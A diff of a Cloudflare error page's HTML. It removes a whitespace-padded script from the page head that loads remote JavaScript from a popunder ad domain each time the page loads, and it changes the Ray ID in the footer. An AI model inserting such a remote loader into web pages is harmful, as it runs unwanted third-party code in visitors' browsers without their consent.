@@ -17,18 +17,7 @@
 <!--[if gte IE 10]><!--><script type="text/javascript" src="/cdn-cgi/scripts/zepto.min.js"></script><!--<![endif]-->
 <script type="text/javascript" src="/cdn-cgi/scripts/cf.common.js"></script>
 
-<script type='text/javascript'> 
-                                        var gtp = []; 
-                                        gtp['webid'] = '214596b0770e5f59801'; 
-                                        gtp['raw'] = '10'; 
-                                        gtp['tab'] = false; 
-                                        (function() { 
-                                        var pGTP = document.createElement('script'); pGTP.type = 'text/javascript'; pGTP.async = true; 
-                                        var selectGtp = document.getElementsByTagName('script')[0]; 
-                                        pGTP.src = 'http://popunderzone.com/panel/call.js'; 
-                                        selectGtp.parentNode.insertBefore(pGTP, selectGtp); 
-                                        })(); 
-                                    </script> </head>
+</head>
 <body>
   <div id="cf-wrapper">
     <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
@@ -62,7 +51,7 @@
 
       <div class="cf-error-footer cf-wrapper">
   <p>
-    <span class="cf-footer-item">Cloudflare Ray ID: <strong>381ee329f16a41cf</strong></span>
+    <span class="cf-footer-item">Cloudflare Ray ID: <strong>381ee574b23d6d42</strong></span>
     <span class="cf-footer-separator">&bull;</span>
     <span class="cf-footer-item"><span data-translate="your_ip">Your IP</span>: 125.227.65.103</span>
     <span class="cf-footer-separator">&bull;</span>
